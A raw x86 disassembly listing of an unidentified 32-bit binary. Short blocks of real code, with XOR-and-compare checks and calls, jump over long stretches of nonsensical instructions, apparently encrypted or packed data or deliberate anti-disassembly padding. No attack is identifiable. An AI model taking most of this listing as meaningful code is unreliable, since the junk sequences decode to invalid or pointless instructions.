  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	add    al,0x82
  411c73:	inc    ebp
  411c74:	inc    eax
  411c75:	aad    0x56
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c53
  411c7e:	mov    esi,ebx
  411c80:	sbb    esi,edi
  411c82:	push   ss
  411c83:	(bad)  
  411c84:	in     al,dx
  411c85:	jne    0x411c08
  411c87:	retf   
  411c88:	inc    eax
  411c89:	ret    0x7a36
  411c8c:	sub    eax,0x85b8cee9
  411c91:	xlat   BYTE PTR ds:[ebx]
  411c92:	sub    dl,ch
  411c94:	jmp    0x411ca3
  411c96:	mov    ebx,0x6bcbb961
  411c9b:	les    ecx,FWORD PTR [eax+0x71]
  411c9e:	add    esi,ebp
  411ca0:	div    ch
  411ca2:	mov    eax,0x3d5083e8
  411ca7:	rcl    bl,cl
  411ca9:	inc    eax
  411caa:	repz mov al,0x46
  411cad:	push   eax
  411cae:	push   esi
  411caf:	cmp    al,0x7
  411cb1:	aam    0x35
  411cb3:	mov    edi,eax
  411cb5:	aad    0x46
  411cb7:	retf   0x150f
  411cba:	jmp    0xae1ea942
  411cbf:	or     BYTE PTR [edx],cl
  411cc1:	ds ins BYTE PTR es:[edi],dx
  411cc3:	cwde   
  411cc4:	or     DWORD PTR [edi+0x5a5165d3],esi
  411cca:	inc    edx
  411ccb:	jb     0x411cb5
  411ccd:	mov    ecx,DWORD PTR [ebx-0x4e]
  411cd0:	dec    edi
  411cd1:	mov    bh,BYTE PTR [ebp-0x56641639]
  411cd7:	adc    al,BYTE PTR [ebx+0x10]
  411cda:	mov    dh,0xdd
  411cdc:	retf   
  411cdd:	es mov bh,0x2a
  411ce0:	add    al,0x46
  411ce2:	mov    ecx,0x1c522437
  411ce7:	das    
  411ce8:	mov    esp,0xf0a45ab0
  411ced:	lock out 0xd9,eax
  411cf0:	in     al,0x0
  411cf2:	add    eax,edx
  411cf4:	(bad)
  411cf7:	les    ecx,FWORD PTR [edx-0x4dc879d4]
  411cfd:	out    0xb,al
  411cff:	cs (bad) 
  411d01:	aas    
  411d02:	jo     0x411d3f
  411d04:	push   esp
  411d05:	or     ecx,0x794d042b
  411d0b:	pop    ss
  411d0c:	repnz cld 
  411d0e:	xchg   esi,eax
  411d0f:	or     eax,0x58e80dbf
  411d14:	cmc    
  411d15:	mov    fs,ebp
  411d17:	inc    ebx
  411d18:	mov    bh,0x20
  411d1a:	(bad)  
  411d1b:	push   ebp
  411d1c:	mov    esi,0x2a3f2c31
  411d21:	ins    DWORD PTR es:[edi],dx
  411d22:	push   0xdeac0315
  411d27:	jg     0x411d68
  411d29:	ss pop edx
  411d2b:	mov    ch,0x59
  411d2d:	retf   0x11ed
  411d30:	inc    ebp
  411d31:	jo     0x411d94
  411d33:	in     eax,dx
  411d34:	mov    esp,0x1e582ee1
  411d39:	pop    eax
  411d3a:	dec    ebp
  411d3b:	adc    BYTE PTR [eax-0x12],ch
  411d3e:	sbb    BYTE PTR [edx+0xb],0xd0
  411d42:	sbb    DWORD PTR ds:0xcd34f9ab,0x8038dceb
  411d4c:	fisubr WORD PTR [ebx-0x8]
  411d4f:	rcr    BYTE PTR [ebx+0x4d4d953f],1
  411d55:	ret    0xd285
  411d58:	sbb    BYTE PTR [eax-0x56],bh
  411d5b:	push   ss
  411d5c:	sahf   
  411d5d:	daa    
  411d5e:	xor    eax,0x1422d81b
  411d63:	clc    
  411d64:	xchg   ebp,eax
  411d65:	jl     0x411d73
  411d67:	arpl   WORD PTR [eax-0xd],dx
  411d6a:	push   edi
  411d6b:	push   edx
  411d6c:	adc    DWORD PTR [edx],0x9414d543
  411d72:	mov    esi,0x5c5fa165
  411d77:	xchg   edx,eax
  411d78:	cdq    
  411d79:	cmp    bl,bh
  411d7b:	jno    0x411de7
  411d7d:	int3   
  411d7e:	mov    ecx,0x89e4ffd
  411d83:	mov    al,ds:0x975c776d
  411d88:	aas    
  411d89:	idiv   al
  411d8b:	jne    0x411daa
  411d8d:	mov    dh,0xeb
  411d8f:	push   ss
  411d90:	pop    esp
  411d91:	push   esi
  411d92:	jg     0x411dcc
  411d94:	jo     0x411d28
  411d96:	outs   dx,DWORD PTR ds:[esi]
  411d97:	dec    ecx
  411d98:	mov    cl,0x29
  411d9a:	cmp    DWORD PTR [ebx],edx
  411d9c:	popf   
  411d9d:	cmp    BYTE PTR [edx],dl
  411d9f:	sub    DWORD PTR [ebx-0x1c154a32],esp
  411da5:	xchg   ecx,eax
  411da6:	es mov edi,0x40e8adaf
  411dac:	es sbb al,0x64
  411daf:	sbb    ebx,DWORD PTR [ecx-0x3e9992f2]
  411db5:	adc    edi,ecx
  411db7:	jmp    FWORD PTR gs:[ebp-0x20]
  411dbb:	cwde   
  411dbc:	and    al,0x17
  411dbe:	pushf  
  411dbf:	sahf   
  411dc0:	dec    esi
  411dc1:	add    al,0xba
  411dc3:	xchg   esi,eax
  411dc4:	lods   al,BYTE PTR ds:[esi]
  411dc5:	ret    
  411dc6:	sbb    esi,ecx
  411dc8:	push   cs
  411dc9:	stos   DWORD PTR es:[edi],eax
  411dca:	mov    al,ds:0xa5c3d930
  411dcf:	lods   eax,DWORD PTR ds:[esi]
  411dd0:	retf   0xe07a
  411dd3:	pusha  
  411dd4:	xor    dh,dl
  411dd6:	and    BYTE PTR [esi-0x41],0xed
  411dda:	dec    esi
  411ddb:	or     al,0x46
  411ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dde:	cs pop ebp
  411de0:	adc    BYTE PTR [esi+eiz*2-0x3ab2ab81],0xd9
  411de8:	out    0x12,eax
  411dea:	aas    
  411deb:	push   cs
  411dec:	pop    edx
  411ded:	inc    esi
  411dee:	xchg   ebx,eax
  411def:	xchg   esi,eax
  411df0:	retf   0xf4e7
  411df3:	and    eax,DWORD PTR [ebp+ebp*4+0x4d]
  411df7:	inc    ebx
  411df8:	push   ebx
  411df9:	jmp    0x411e21
  411dfb:	push   es
  411dfc:	test   BYTE PTR [edx],al
  411dfe:	fidiv  DWORD PTR [ebx+0x26]
  411e01:	jg     0x411d8d
  411e03:	sub    ebx,edi
  411e05:	mov    al,ds:0x53d3c105
  411e0a:	jae    0x411e71
  411e0c:	jnp    0x411e00
  411e0e:	jmp    0xa68e:0x120b5ed9
  411e15:	leavew 
  411e17:	pop    ss
  411e18:	out    dx,al
  411e19:	or     esi,DWORD PTR [edi+0x2a]
  411e1c:	int    0x3c
  411e1e:	lods   al,BYTE PTR ds:[esi]
  411e1f:	pop    esp
  411e20:	test   DWORD PTR [ebx-0x20],0x579ea18d
  411e27:	dec    ecx
  411e28:	cmp    BYTE PTR [esi+0x7700ec57],bh
  411e2e:	cmp    dl,BYTE PTR [di]
  411e31:	fcom   QWORD PTR [ebp-0x5559bc9c]
  411e37:	cmc    
  411e38:	aas    
  411e39:	(bad)  
  411e3a:	outs   dx,DWORD PTR ds:[esi]
  411e3b:	popf   
  411e3c:	mov    dh,cl
  411e3e:	lods   al,BYTE PTR ds:[esi]
  411e3f:	sub    esi,ebx
  411e41:	pop    esp
  411e42:	das    
  411e43:	jns    0x411e42
  411e45:	loope  0x411e3b
  411e47:	jbe    0x411e8a
  411e49:	shl    DWORD PTR [edx+0x22c91eee],1
  411e4f:	retf   
  411e50:	push   edx
  411e51:	cmp    eax,0x64210bc1
  411e56:	fmulp  st(4),st
  411e58:	adc    eax,0xac3915e6
  411e5d:	dec    edx
  411e5e:	loopne 0x411ea0
  411e60:	add    ecx,DWORD PTR [eax+edi*4]
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	not    DWORD PTR [ebx]
  411ec1:	jb     0x411ead
  411ec3:	xor    BYTE PTR [eax+0x7e],dl
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411ef7
  411ecc:	xor    al,0xcc
  411ece:	jg     0x411e6e
  411ed0:	pop    edi
  411ed1:	test   DWORD PTR [edx+0x13542ac4],ebx
  411ed7:	inc    edx
  411ed8:	sbb    eax,0xd2eb79f2
  411edd:	neg    DWORD PTR [edi+0x780348af]
  411ee3:	in     eax,dx
  411ee4:	in     eax,dx
  411ee5:	jbe    0x411ea4
  411ee7:	rcl    BYTE PTR [ecx],1
  411ee9:	jge    0x411ee2
  411eeb:	in     al,0xa5
  411eed:	repnz (bad) 
  411ef0:	mov    esp,0xf158bdbe
  411ef5:	push   es
  411ef6:	dec    ebx
  411ef7:	jo     0x411f62
  411ef9:	data16 lahf 
  411efb:	scas   al,BYTE PTR es:[edi]
  411efc:	cmp    cl,dl
  411efe:	pop    ecx
  411eff:	lahf   
  411f00:	outs   dx,DWORD PTR ds:[esi]
  411f01:	mov    eax,0xa0a6bc74
  411f06:	dec    edx
  411f07:	cmp    ch,BYTE PTR [ebx+0x7e]
  411f0a:	lods   eax,DWORD PTR ds:[esi]
  411f0b:	ja     0x411f34
  411f0d:	sbb    ah,dl
  411f0f:	and    ch,BYTE PTR [ebp-0x45e9cd19]
  411f15:	les    edx,FWORD PTR [edi+0x7f]
  411f18:	sbb    edx,esi
  411f1a:	sbb    edx,ebp
  411f1c:	mov    ah,bh
  411f1e:	adc    BYTE PTR [ebx*8+0x2ed8df9b],bl
  411f25:	jno    0x411eaf
  411f27:	or     edx,esi
  411f29:	das    
  411f2a:	lods   eax,DWORD PTR ds:[esi]
  411f2b:	pop    edx
  411f2c:	push   esi
  411f2d:	mov    cs,WORD PTR [edi]
  411f2f:	(bad)  
  411f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f31:	call   0x644e2ee5
  411f36:	xchg   esp,eax
  411f37:	mov    eax,0xbdf72065
  411f3c:	mov    eax,0x7094df1f
  411f41:	mov    WORD PTR [ebp-0x4d9aa35e],cs
  411f47:	in     eax,0x27
  411f49:	xor    bh,BYTE PTR [ecx+eax*4+0x1374255f]
  411f50:	nop
  411f51:	sbb    BYTE PTR ds:0xcd71c575,bl
  411f57:	(bad)  
  411f58:	(bad)  
  411f59:	mov    ds:0x2c7a4370,al
  411f5e:	mov    ecx,0x813baab7
  411f63:	xor    DWORD PTR [edi],0x97ffa76d
  411f69:	xchg   ebx,eax
  411f6a:	mov    al,ds:0x7f1a6393
  411f6f:	sub    BYTE PTR [ebp-0x1b],ah
  411f72:	popa   
  411f73:	mov    esi,0xbaa2ef51
  411f78:	loopne 0x411fe5
  411f7a:	mov    BYTE PTR [esi],al
  411f7c:	sbb    eax,0x35eec07c
  411f81:	adc    DWORD PTR [esi],ebp
  411f83:	loopne 0x411f56
  411f85:	xor    esp,edi
  411f87:	(bad)  
  411f88:	nop
  411f89:	ficom  WORD PTR [esi-0x80]
  411f8c:	ret    0x9ac5
  411f8f:	in     al,0xe4
  411f91:	out    0x81,al
  411f93:	and    eax,0xb3ddd37a
  411f98:	(bad)  
  411f9a:	out    dx,eax
  411f9b:	jbe    0x411f99
  411f9d:	jl     0x411f4d
  411f9f:	lds    eax,FWORD PTR [edi-0x6ad5b5a0]
  411fa5:	mov    al,0x82
  411fa7:	rol    DWORD PTR [ebx-0x22],cl
  411faa:	scas   eax,DWORD PTR es:[edi]
  411fab:	int3   
  411fac:	sbb    al,0xe0
  411fae:	pushf  
  411faf:	sti    
  411fb0:	sahf   
  411fb1:	cli    
  411fb2:	mov    ds,WORD PTR [edx+0x5ec5f9ef]
  411fb8:	repnz and al,0xc3
  411fbb:	xchg   edx,eax
  411fbc:	call   0x2432971f
  411fc1:	xlat   BYTE PTR ds:[ebx]
  411fc2:	test   DWORD PTR [esi],edx
  411fc4:	pop    DWORD PTR [ebx+0x4cdc1cb4]
  411fca:	popa   
  411fcb:	and    esi,eax
  411fcd:	pshufw mm2,QWORD PTR [eax+0x24c9e689],0x69
  411fd5:	(bad)  
  411fd7:	mov    esp,0x3721dc89
  411fdc:	mov    edx,0xcfaf4f33
  411fe1:	and    bh,BYTE PTR [ecx]
  411fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fe4:	sbb    edi,DWORD PTR [ecx-0x4bc5c02]
  411fea:	fdiv   QWORD PTR [eax+0x78]
  411fed:	dec    ebp
  411fee:	mov    esp,0x7868597a
  411ff3:	pop    es
  411ff4:	in     eax,0xcf
  411ff6:	fimul  DWORD PTR [esi-0x69]
  411ff9:	test   BYTE PTR [ebp-0x6c2ec70],0x7
  412000:	and    DWORD PTR ds:0xff9c650f,ecx
  412006:	dec    eax
  412007:	dec    edi
  412008:	add    BYTE PTR [ecx-0x23459deb],0x36
  41200f:	aam    0x73
  412011:	pop    esi
  412012:	sbb    al,0x41
  412014:	fnsave [ecx+0x5d]
  412017:	xor    BYTE PTR fs:[ecx],bl
  41201a:	push   edi
  41201b:	jb     0x412077
  41201d:	mov    ch,0xe8
  41201f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412020:	inc    edx
  412021:	inc    edi
  412022:	xchg   ecx,eax
  412023:	or     BYTE PTR [edi-0x54],cl
  412026:	dec    edx
  412027:	inc    edi
  412028:	not    BYTE PTR [ebx-0x24]
  41202b:	fdivr  QWORD PTR [ebx]
  41202d:	or     DWORD PTR [ebx],edi
  41202f:	xor    DWORD PTR [ebx+0x1f9fe6c1],eax
  412035:	test   BYTE PTR [ebp+0x694bb9a7],0x93
  41203c:	data16 adc al,0x54
  41203f:	push   es
  412040:	xor    eax,0x1054d59f
  412045:	lds    edx,FWORD PTR [edx-0x2b]
  412048:	cmp    al,0x7
  41204a:	dec    edi
  41204b:	data16 stos BYTE PTR es:[edi],al
  41204d:	mov    eax,ds:0xfde2334b
  412052:	add    BYTE PTR [ebp-0x5814d2ca],al
  412058:	les    edi,FWORD PTR [eax+0x7e]
  41205b:	jne    0x41203a
  41205d:	adc    ah,BYTE PTR [esi-0x16]
  412060:	shr    DWORD PTR [eax+esi*2+0x5b],1
  412064:	xlat   BYTE PTR ds:[ebx]
  412065:	lods   al,BYTE PTR ds:[esi]
  412066:	or     bh,al
  412068:	and    al,0x5c
  41206a:	or     eax,edi
  41206c:	scas   al,BYTE PTR es:[edi]
  41206d:	lds    esp,FWORD PTR [ebp+0x3b]
  412070:	sbb    bh,BYTE PTR [edx+0x72]
  412073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412075:	push   esi
  412076:	popa   
  412077:	pop    esi
  412078:	icebp  
  412079:	sbb    eax,0xa9897a96
  41207e:	pop    eax
  41207f:	add    cl,BYTE PTR [eax-0x22]
  412082:	push   cs
  412083:	jnp    0x41209a
  412085:	shl    BYTE PTR [ebx+0x5c],1
  412088:	inc    eax
  412089:	add    bl,BYTE PTR [esi+0x79d03d66]
  41208f:	fucomp st(3)
  412091:	mov    esp,0xbdaf6c90
  412096:	dec    ebp
  412097:	es dec ebp
  412099:	jmp    0x4120b7
  41209b:	retf   0xc88b
  41209e:	retf   0xcb26
  4120a1:	mov    WORD PTR [ebx],?
  4120a3:	retf   
  4120a4:	ficom  DWORD PTR [edx-0x123bd224]
  4120aa:	gs push esi
  4120ac:	mov    ah,0x33
  4120ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4120b1:	mov    eax,DWORD PTR [ecx+eax*4]
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	sbb    edx,esi
  4120c7:	stc    
  4120c8:	nop
  4120c9:	adc    edx,DWORD PTR [edx+0x7e]
  4120cc:	jle    0x412127
  4120ce:	jg     0x41214e
  4120d0:	jle    0x412063
  4120d2:	pop    ss
  4120d3:	jmp    0xf430:0xb2f1dd0a
  4120da:	jecxz  0x4120d0
  4120dc:	mov    DWORD PTR [esp+ebp*1-0x4d6ec0f0],ecx
  4120e3:	pop    ebp
  4120e4:	or     eax,0x37e50b71
  4120e9:	dec    ebp
  4120ea:	adc    al,0xd7
  4120ec:	inc    edx
  4120ed:	push   es
  4120ee:	sub    BYTE PTR [ebx+ebx*4],0x15
  4120f2:	cmp    eax,DWORD PTR [edi-0x568defea]
  4120f8:	ins    BYTE PTR es:[edi],dx
  4120f9:	push   ebp
  4120fa:	jmp    FWORD PTR [esi]
  4120fc:	or     esi,DWORD PTR [eax-0x23261d24]
  412102:	add    al,0x7f
  412104:	jle    0x412092
  412106:	sub    ah,BYTE PTR [ebx*8-0x1f4e00f4]
  41210d:	pop    es
  41210e:	test   al,0xae
  412110:	loopne 0x412119
  412112:	sub    eax,0x70dd6206
  412117:	lods   eax,DWORD PTR ds:[esi]
  412118:	mov    bh,0xc3
  41211a:	outs   dx,BYTE PTR ds:[esi]
  41211b:	xchg   ebp,ebp
  41211d:	jmp    0x41210e
  41211f:	stos   BYTE PTR es:[edi],al
  412120:	fwait
  412121:	xor    eax,DWORD PTR [esp+ebx*4-0x21488c3b]
  412128:	pop    es
  412129:	dec    esi
  41212a:	add    al,0x7a
  41212c:	sar    DWORD PTR [edi],1
  41212e:	mov    dl,0xa
  412130:	(bad)  [ebp+0x63]
  412133:	jnp    0x412192
  412135:	sbb    esi,DWORD PTR [esi-0x9]
  412138:	mov    bl,0x53
  41213a:	xchg   esp,eax
  41213b:	jg     0xb202bcce
  412141:	sbb    ah,BYTE PTR [ecx+eax*2]
  412144:	int    0x3a
  412146:	pop    esp
  412147:	repz push cs
  412149:	adc    bl,BYTE PTR [ebp-0x10503bd6]
  41214f:	mov    esp,0x29937dbf
  412154:	ret    0x726b
  412157:	clc    
  412158:	sub    ecx,DWORD PTR [ebx]
  41215a:	ins    BYTE PTR es:[edi],dx
  41215b:	aaa    
  41215c:	es imul ebx,ebx,0x77
  412160:	push   0xe1b31009
  412165:	inc    eax
  412166:	cmp    eax,0x4067f2d2
  41216b:	push   cs
  41216c:	jg     0x4121a2
  41216e:	sbb    eax,0x33be4dee
  412173:	mov    ch,0x96
  412175:	outs   dx,DWORD PTR ds:[esi]
  412176:	cmc    
  412177:	mov    esi,0x114daa22
  41217c:	mov    al,0xdc
  41217e:	std    
  41217f:	add    BYTE PTR [ebp+0x27],bl
  412182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412183:	push   esi
  412184:	mov    ah,0x27
  412186:	cmc    
  412187:	rcl    ecx,cl
  412189:	lods   eax,DWORD PTR ds:[esi]
  41218a:	mov    edi,0x3aa7e7ea
  41218f:	fcomp  DWORD PTR [esi-0x5ca89d95]
  412196:	call   0x3b8e:0x5b438bcf
  41219d:	xor    bl,BYTE PTR [ebx]
  41219f:	mov    ds:0x9d904fe6,al
  4121a4:	and    BYTE PTR [ebx],al
  4121a6:	ret    
  4121a7:	mov    esp,0x779eedbf
  4121ac:	imul   esp,DWORD PTR [ebx+edi*8+0x4f4d21fe],0x13
  4121b4:	int    0x94
  4121b6:	out    0xc,al
  4121b8:	jb     0x412147
  4121ba:	js     0x412172
  4121bc:	mov    ebp,0xb77b29e7
  4121c1:	mov    al,ds:0xe7d6de84
  4121c6:	and    cl,BYTE PTR [ebx-0x2bc0242f]
  4121cc:	aas    
  4121cd:	mov    bh,0x15
  4121cf:	jne    0x41217f
  4121d1:	out    0xee,eax
  4121d3:	fs out 0xa3,al
  4121d6:	retf   0x3036
  4121d9:	aaa    
  4121da:	pop    es
  4121db:	inc    esp
  4121dc:	dec    esi
  4121dd:	test   DWORD PTR [edx+0x432fbfe3],edx
  4121e3:	dec    eax
  4121e4:	push   eax
  4121e5:	aad    0x2e
  4121e7:	sub    ebx,DWORD PTR ds:0x91dc3107
  4121ed:	gs loope 0x412243
  4121f0:	jg     0x4121ba
  4121f2:	xor    DWORD PTR [edx],eax
  4121f4:	pop    ds
  4121f5:	lahf   
  4121f6:	jbe    0x4121bc
  4121f8:	addr16 xchg bh,ch
  4121fb:	or     edx,DWORD PTR [ecx]
  4121fd:	adc    DWORD PTR [edx],esp
  4121ff:	or     eax,0xda3db43d
  412204:	aaa    
  412205:	xchg   bh,al
  412207:	sub    ebp,ecx
  412209:	sti    
  41220a:	cmp    DWORD PTR [esi+ebp*2+0x48],edx
  41220e:	outs   dx,BYTE PTR ds:[esi]
  41220f:	pop    es
  412210:	jo     0x41221c
  412212:	pop    edi
  412213:	into   
  412214:	mov    bh,BYTE PTR [ebx-0x5bb911a8]
  41221a:	jb     0x4121b0
  41221c:	jmp    0xdc4051a6
  412221:	sub    eax,0xcff27920
  412226:	test   al,0xd5
  412228:	mov    edx,esp
  41222a:	and    DWORD PTR ds:0x515b2215,esp
  412230:	inc    BYTE PTR [ebp+0x419c1166]
  412236:	out    0x1f,eax
  412238:	and    DWORD PTR [ecx],eax
  41223a:	push   es
  41223b:	in     eax,dx
  41223c:	cmp    al,0x70
  41223e:	aaa    
  41223f:	push   ss
  412240:	sti    
  412241:	outs   dx,DWORD PTR ds:[esi]
  412242:	or     ah,cl
  412244:	int3   
  412245:	cmp    al,0xa6
  412248:	sbb    ebx,eax
  41224a:	jno    0x4121ff
  41224c:	xor    ch,BYTE PTR [esi-0x286541bf]
  412252:	ret    
  412253:	mov    esp,0xcdd1ece6
  412258:	push   0xfdccf067
  41225d:	xor    edx,0xffffffe1
  412260:	xchg   esp,eax
  412261:	mov    cl,0xf
  412263:	aam    0x72
  412265:	fnstenv ds:0x91e50f19
  41226b:	inc    edx
  41226c:	ror    BYTE PTR [ecx-0x5d2318bd],1
  412272:	enter  0xec60,0xbb
  412276:	mov    ch,0xfa
  412278:	push   0x8d6ad02
  41227d:	push   es
  41227e:	cdq    
  41227f:	imul   edi,DWORD PTR [ecx-0x65],0x2d
  412283:	in     eax,0xcb
  412285:	mov    cl,BYTE PTR [edx+0x47]
  412288:	repnz adc BYTE PTR [edi-0x266b0a69],dh
  41228f:	ret    
  412290:	adc    eax,0xa7b2499a
  412295:	ret    
  412296:	scas   al,BYTE PTR es:[edi]
  412297:	sbb    al,0x13
  412299:	nop
  41229a:	push   esi
  41229b:	or     DWORD PTR [edi+0x382fe4c2],esi
  4122a1:	sub    al,0x41
  4122a3:	outs   dx,DWORD PTR ds:[esi]
  4122a4:	ss dec esp
  4122a6:	out    dx,eax
  4122a7:	xor    eax,esi
  4122a9:	add    BYTE PTR [edx+0x7d],bl
  4122ac:	fisttp WORD PTR [esi]
  4122ae:	test   al,0x35
  4122b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b1:	add    al,BYTE PTR [edi]
  4122b3:	push   cs
  4122b4:	mov    DWORD PTR [ebp+0xc],eax
  4122b7:	mov    eax,DWORD PTR [ebp-0x4]
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0x397ec13],ch
  4122ef:	fist   WORD PTR [eax+0x7e7e5c7e]
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x412316
  4122fa:	adc    eax,0x89e4ffed
  4122ff:	sar    BYTE PTR [ebx-0x74],1
  412302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412303:	jne    0x41234c
  412305:	shr    BYTE PTR [eax-0x22],cl
  412308:	dec    eax
  412309:	into   
  41230a:	pop    esi
  41230b:	pop    ss
  41230c:	int3   
  41230d:	jno    0x412310
  41230f:	push   ds
  412310:	ds xor al,0xf
  412313:	sbb    eax,0x28696d37
  412318:	xchg   edx,eax
  412319:	scas   eax,DWORD PTR es:[edi]
  41231a:	ror    bl,cl
  41231c:	clc    
  41231d:	sahf   
  41231e:	mov    al,ds:0x927b3001
  412323:	xchg   ebp,eax
  412324:	push   edx
  412325:	mov    eax,0x9d1edf2a
  41232a:	dec    esp
  41232b:	and    al,BYTE PTR [edx-0x59]
  41232e:	call   0x82422f03
  412333:	push   esi
  412334:	pushf  
  412335:	lahf   
  412336:	push   0x2
  412338:	pop    es
  412339:	aas    
  41233a:	imul   esi,DWORD PTR [ebx-0x56f7f792],0x6a
  412341:	call   DWORD PTR [ebp-0x21b881d5]
  412347:	in     eax,0x1a
  412349:	jg     0x412306
  41234b:	and    BYTE PTR [ebx-0x1e],bl
  41234e:	in     al,0x7a
  412350:	ror    BYTE PTR [edx+0x6e],0xff
  412354:	imul   BYTE PTR [ebp+0x6a0fde5c]
  41235a:	sti    
  41235b:	fs mov bh,0x8a
  41235f:	xlat   BYTE PTR ds:[ebx]
  412360:	ret    
  412361:	out    0x9,eax
  412363:	mov    ebx,0xb4c612ab
  412368:	jmp    0x26fc2d73
  41236d:	cmp    cl,BYTE PTR [esi]
  41236f:	push   edx
  412371:	dec    esi
  412372:	out    dx,al
  412373:	stos   BYTE PTR es:[edi],al
  412374:	dec    eax
  412375:	in     eax,0x94
  412377:	sbb    esi,0x73
  41237a:	and    eax,0x96f2692c
  41237f:	pop    esp
  412380:	jns    0x41235d
  412382:	sbb    al,0x93
  412384:	test   DWORD PTR [edx+ecx*2-0x3853f546],esi
  41238b:	rol    BYTE PTR [edi+esi*2-0x17],0xaa
  412390:	xor    al,0xfc
  412392:	adc    eax,0x68964e9d
  412397:	int    0x8d
  412399:	mov    DWORD PTR [esi+esi*1-0x5fb34c05],esi
  4123a0:	mov    al,ds:0xabb5462d
  4123a5:	or     al,BYTE PTR [eax-0x51]
  4123a8:	jns    0x41238d
  4123aa:	mov    DWORD PTR [eax-0x173e4de5],esp
  4123b0:	les    edx,FWORD PTR [ecx-0x5c5c73a6]
  4123b6:	lock sub al,0xe8
  4123b9:	or     eax,0x5117b113
  4123be:	aas    
  4123bf:	pop    ds
  4123c0:	clc    
  4123c1:	add    al,0x98
  4123c3:	(bad)  
  4123c4:	pop    ebx
  4123c5:	sbb    esi,0x2e
  4123c8:	mov    al,0xe5
  4123ca:	ins    DWORD PTR es:[edi],dx
  4123cb:	push   eax
  4123cc:	ret    0xd29f
  4123cf:	es leave 
  4123d1:	inc    ebp
  4123d2:	fimul  DWORD PTR [ecx]
  4123d4:	cdq    
  4123d5:	aam    0xb2
  4123d7:	test   eax,0x42aefbaf
  4123dc:	test   DWORD PTR [edi+0xb],0xf806772c
  4123e3:	das    
  4123e4:	pop    ss
  4123e5:	push   eax
  4123e6:	cmp    BYTE PTR [ebx],cl
  4123e8:	jg     0x412406
  4123ea:	cld    
  4123eb:	jmp    0x412441
  4123ed:	mov    bl,0x46
  4123ef:	pushf  
  4123f0:	fmul   QWORD PTR [esi]
  4123f2:	imul   esp,DWORD PTR [edi-0x72ab7139],0x6d79e0b6
  4123fc:	daa    
  4123fd:	add    bh,BYTE PTR [esi+0x1f8c6058]
  412403:	pop    edx
  412404:	mov    cl,0x26
  412406:	jl     0x412410
  412408:	scas   eax,DWORD PTR es:[edi]
  412409:	sahf   
  41240a:	add    al,BYTE PTR [edi-0x1c]
  41240d:	or     DWORD PTR [edx],esi
  41240f:	or     al,0x12
  412411:	cli    
  412412:	test   al,0x21
  412414:	pop    eax
  412415:	outs   dx,DWORD PTR ds:[esi]
  412416:	inc    esi
  412417:	push   edx
  412418:	stos   DWORD PTR es:[edi],eax
  412419:	ja     0x4123d0
  41241b:	xchg   ebx,eax
  41241c:	leave  
  41241d:	xchg   ecx,eax
  41241e:	or     BYTE PTR [eax+0x39e71841],ah
  412424:	lods   eax,DWORD PTR ds:[esi]
  412425:	xor    ah,cl
  412427:	aas    
  412428:	inc    ecx
  412429:	scas   eax,DWORD PTR es:[edi]
  41242a:	mov    ebx,0x22f78bfb
  41242f:	clc    
  412430:	jae    0x4123db
  412432:	rcr    DWORD PTR [ebp-0x469b3017],0x85
  412439:	add    esp,edi
  41243b:	sar    ebp,cl
  41243d:	aad    0x48
  41243f:	in     eax,0x8a
